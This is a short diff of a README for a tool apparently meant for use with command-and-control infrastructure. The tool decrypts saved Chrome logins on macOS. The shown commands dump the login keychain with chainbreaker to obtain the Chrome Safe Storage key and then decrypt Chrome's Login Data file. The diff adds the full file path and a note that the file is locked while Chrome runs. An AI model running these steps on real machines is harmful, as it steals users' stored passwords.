@@ -28,7 +28,8 @@ This tool is intended to be used with C2.
 ```sh
 # extract Chrome Safe Storage value
 ➜  ~ ./chainbreaker.py --dump-all login.keychain-db --password=<login-keychain password>
-➜  ~ macLoginData Chrome 'Login Data' <Chrome Safe Storage>
+# Note: Login Data is locked while Chrome is running
+➜  ~ macLoginData Chrome '/Users/<username>/Library/Application Support/Google/Chrome/Default/Login Data' <Chrome Safe Storage>
 ```
 
 #### Option
